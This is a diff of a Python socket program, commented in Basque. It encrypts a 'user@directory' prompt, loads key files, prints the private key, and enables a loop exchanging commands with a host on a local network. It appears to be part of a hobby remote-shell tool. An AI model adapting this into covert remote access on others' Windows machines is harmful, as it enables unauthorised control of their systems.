@@ -27,7 +27,9 @@ class server(object):
     def comandLine(self):
           user = win32api.GetUserName()
           url = os.getcwd()#ruta aktuala 
-          self.soc.send(bytes( user + "@" + url,encoding = 'utf-8'))# bidali ruta aktuala
+          ruter = bytes(user+'@'+url,encoding='utf-8')
+          ruterENc = self.GPG.encrypted(ruter)
+          self.soc.send(ruterENc)# bidali ruta aktuala
           hartuta = self.soc.recv(1024) # guk bidalitako mezua hartuko du (1024) bytes
           stri = str(hartuta,encoding='utf-8')   
           print(stri)
@@ -44,6 +46,12 @@ class server(object):
         with open('pUserver.pem', "rb") as key_file:
            filBT = key_file.read()
         self.soc.send(filBT)
+    
+    def keysLoad(self):
+        self.GPG.loadPublic("pUcliente.pem")
+        os.chdir("..\\prybate")
+        self.GPG.loadPrymari("prybate.pem")
+        print(self.GPG.private_key)
 
     def koneksioa(self):
       while True:
@@ -156,8 +164,10 @@ class server(object):
 ser = server("192.168.0.14",9999,1)
 ser.getPuKey()
 ser.postPuKey()
-#while True:
-  # comand =  ser.comandLine()
+ser.keysLoad()
+
+while True:
+    comand =  ser.comandLine()
 
 
 
